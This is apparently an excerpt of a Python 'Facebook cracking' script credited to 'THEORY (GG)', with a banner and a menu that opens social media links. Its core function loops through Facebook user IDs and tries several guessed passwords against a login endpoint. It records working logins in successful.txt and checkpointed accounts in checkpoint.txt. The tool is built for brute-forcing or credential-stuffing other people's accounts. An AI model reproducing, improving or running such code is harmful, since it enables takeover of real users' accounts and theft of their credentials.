...
|__  $$__/| $$  | $$| $$_____/ /$$__  $$| $$__  $$|  $$   /$$/
   ...
   | $$   | $$  | $$| $$      | $$  | $$| $$  \ $$    | $$    
   | $$   | $$  | $$| $$$$$$$$|  $$$$$$/| $$  | $$    | $$    
   |__/   |__/  |__/|________/ \______/ |__/  |__/    |__/    
                                                              
 ------------------------------------------

   Author   : THEORY (GG)
   Github   : https://github.com/theorygg
   Youtube  : FREE SCRIPT YT
   Telegram : FREE SCRIPT YT
...
def reg():
    ...
    if to in r:
        ...
        os.system("xdg-open https://t.me/mh15gamingl")
        time.sleep(5)
        login()
    else:
        os.system("clear")
        ...
        os.system("xdg-open https://wa.me/message/VXJNCUBKMBSHE1?src=qr")
        reg()
def reg2():
    os.system("clear")
    print(logo)
...
def menu_option():
	...
	if select =="1":
		...
		os.system('xdg-open https://youtube.com/channel/UCRZF-alAukIkU38-suVVYGA')
	elif select =='4':
	    os.system('xdg-open https://youtube.com/channel/UCRZF-alAukIkU38-suVVYGA')
	elif select =='5':
...
def crack_select():
	...
	print(47*"-")
	print("")
	print("\t\033[1;32mCreated by: THEORY (GG) Group\033[0;97m")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print(" \033[1;35m[GG-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error"]:
					print(" \033[1;33m[GG-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					q = json.loads(data)
					if "loc" in q:
						print(" \033[1;35m[GG-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print(" \033[1;33m[GG-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "loc" in q:
								print(" \033[1;35m[GG-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									print(" \033[1;33m[GG-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
						...
						if "www.facebook.com" in q["error"]:
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print(" \033[1;35m[GG-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
										...
										if "www.facebook.com" in q["error"]:
											print(" \033[1;33m[GG-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
